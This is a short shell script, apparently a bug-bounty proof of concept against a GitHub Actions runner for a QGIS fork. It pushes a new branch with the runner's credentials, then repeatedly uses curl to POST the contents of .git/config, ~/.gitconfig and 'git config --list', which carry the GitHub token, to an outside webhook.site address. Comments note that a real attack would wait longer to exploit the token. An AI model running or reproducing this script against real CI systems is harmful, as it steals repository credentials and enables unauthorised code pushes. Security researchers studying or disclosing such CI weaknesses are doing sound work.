#filename: myscript.sh
echo -------------poc_rce-------------- >&2

git config --list >&2

echo "--- creating maliciuse branch can be easly master push or release change--" 
git config --global user.email "bh@someemail.com"
git config --global user.name "H1Tester"
git fetch origin >&2
git checkout master >&2
git pull origin master >&2
git checkout -b bh-poc >&2
git add . >&2
git push -u origin bh-poc >&2

echo "--- token exfiltration ---" 

export webhook="https://webhook.site/0adc90cc-a61d-4cda-b4f5-c4bc887c7336"
export repo=barakharyati/QGIS-fork

curl -X POST \
  -H "Content-Type: text/plain" \
  --data "$(cat /home/runner/work/${repo}/.git/config)" \
    "$webhook/githubtoken"


curl -X POST \
  -H "Content-Type: text/plain" \
  --data "$(cat /home/runner/work/${repo}/.git/config)" \
    "$webhook/githubtoken"

curl -X POST \
  -H "Content-Type: text/plain" \
  --data "$(git config --list)" \
    "$webhook/githubtoken"



curl -X POST \
  -H "Content-Type: text/plain" \
  --data "$(cat /home/runner/.gitconfig)" \
    "$webhook/githubtoken"

curl -X POST \
  -H "Content-Type: text/plain" \
  --data "$(cat /home/runner/work/${repo}/.git/config)" \
  "$webhook/githubtoken"


echo "now go to sleep in reale attack it will be longer "
sleep 2 # in real attack it will be 1200 to have time to edit 
